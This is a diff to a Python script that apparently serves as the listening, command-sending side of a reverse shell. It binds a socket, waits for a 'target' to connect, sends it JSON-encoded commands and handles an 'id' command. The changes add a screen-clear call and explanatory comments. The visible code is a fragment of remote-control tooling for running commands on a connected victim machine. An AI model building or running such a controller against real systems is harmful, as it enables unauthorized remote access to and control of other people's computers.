@@ -11,6 +11,8 @@ import colorama
 from colorama import Fore, Back
 colorama.init(autoreset=True)
 
+os.system('cls') # allows for color in input
+
 def reliable_send(data):
 	json_data = json.dumps(data).encode()
 	target.send(json_data)
@@ -37,7 +39,7 @@ def shell():
 				continue
 		elif command == "id":
 			try:
-				user = os.getlogin()
+				user = os.getlogin() # id discovers the user on the listening machine. Run whoami for target user
 				print(Fore.RED + user)
 			except:
 				continue
@@ -49,10 +51,10 @@ def server ():
 	global s
 	global ip
 	global target
-	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # starts socket api to send messages across network 
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	s.bind(("127.0.0.1",54321))  #ip of host + desired port
-	s.listen(5)
+	s.listen(5) 
 	print ("LISTENING FOR INCOMING CONNECTIONS")
 	target, ip = s.accept()
 	print ("Target connected!")
